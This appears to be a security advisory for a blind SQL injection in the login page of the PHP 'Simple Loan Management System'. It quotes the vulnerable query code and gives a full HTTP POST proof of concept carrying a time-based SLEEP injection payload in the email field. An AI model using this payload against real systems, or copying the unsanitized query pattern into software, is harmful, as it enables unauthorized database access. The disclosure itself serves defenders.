# Blind SQL Injection in Simple Loan Management System

## Vendor Homepage:
> https://codeastro.com/simple-loan-management-system-in-php-with-source-code/

## Affected Component
> /index.php

## Code
```php
if(isset($login))
{
  $pass=sha1($pass);
  $que=mysqli_query($conn,"select * from admin where user='$email' and pass='$pass'");
  $row=mysqli_num_rows($que);
  if($row)
			{	
				$_SESSION['admin']=$email;
				header('location:admin');
			}
		else
			{
				$err="<font color='red'>Wrong Email or Password!</font>";
			}
	}
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /SimpleLoanSystem/index.php HTTP/1.1
Content-Length: 85
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Referer: http://localhost/SimpleLoanSystem/index.php
Cookie: PHPSESSID=qr4c4tv56jj7l2j77ju7tpu9h8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Connection: keep-alive

email=admin%40mail.com'+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))a)--+&pass=x&login=Login
```

## Screenshot
![image](https://github.com/user-attachments/assets/ad087ee9-0a16-4fc2-b987-0da512fc2041)



## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
